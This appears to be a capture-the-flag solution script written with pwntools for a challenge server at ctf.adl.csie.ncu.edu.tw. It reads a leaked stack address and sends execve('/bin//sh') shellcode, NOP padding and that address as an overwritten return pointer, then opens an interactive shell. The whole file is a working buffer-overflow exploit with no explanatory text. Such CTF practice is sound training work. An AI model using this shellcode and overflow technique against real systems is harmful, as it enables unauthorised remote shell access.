from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11003
p = remote(host, port)

context.arch = "amd64"
l = p.recvline()
addr = int(l.decode('utf-8').split("0x")[1].rstrip(),16)
print(l)
p.sendline( b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c" + 
	    b"\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52" + 
	    b"\x57\x54\x5e\xb0\x3b\x0f\x05" + b"\x90"*0x65 + p64(addr))
p.interactive()
